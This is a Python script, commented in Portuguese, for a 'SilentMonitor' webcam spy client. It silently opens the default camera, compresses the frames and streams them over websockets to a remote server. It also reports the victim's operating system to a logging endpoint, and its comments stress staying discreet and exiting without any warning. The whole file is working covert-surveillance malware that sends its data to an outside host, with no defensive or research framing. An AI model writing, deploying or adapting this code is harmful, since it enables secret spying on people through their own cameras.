import cv2
import socketio
import base64
import time
import requests
import platform
import threading
import sys
import os

# CONFIGURAÇÕES
SERVER_URL = "https://hackl.onrender.com"
LINK_CODE = "NATIVE_CLIENT"

class SilentMonitor:
    def __init__(self):
        self.sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=1)
        self.running = False

    def log_access(self):
        try:
            requests.post(f"{SERVER_URL}/log_access", json={
                'code': LINK_CODE,
                'browser': 'Auto-Start Client',
                'os': platform.system() + " " + platform.release(),
                'email': 'silent@client.app'
            }, timeout=5)
        except:
            pass

    def capture_loop(self):
        cap = cv2.VideoCapture(0)
        # Tenta abrir a câmera silenciosamente
        if not cap.isOpened():
            return

        while self.running:
            ret, frame = cap.read()
            if not ret: 
                time.sleep(1)
                continue
            
            # Qualidade otimizada para o Render (discreto e rápido)
            frame = cv2.resize(frame, (480, 360))
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 25])
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            
            try:
                self.sio.emit('native_frame', {
                    'id': self.sio.sid,
                    'frame': 'data:image/jpeg;base64,' + jpg_as_text
                })
            except:
                break
            time.sleep(0.15) # ~7 FPS (mais discreto no uso de CPU/Internet)
        
        cap.release()

    def start(self):
        try:
            # Conecta com transporte websocket para evitar 404
            self.sio.connect(SERVER_URL, socketio_path='/socket.io', transports=['websocket', 'polling'])
            self.running = True
            self.log_access()
            
            # Inicia o loop de captura
            self.capture_loop()
        except Exception as e:
            # Em modo silencioso, falhas apenas encerram o processo sem avisar
            sys.exit(0)

if __name__ == "__main__":
    # Garante que o processo rode de forma independente
    monitor = SilentMonitor()
    monitor.start()
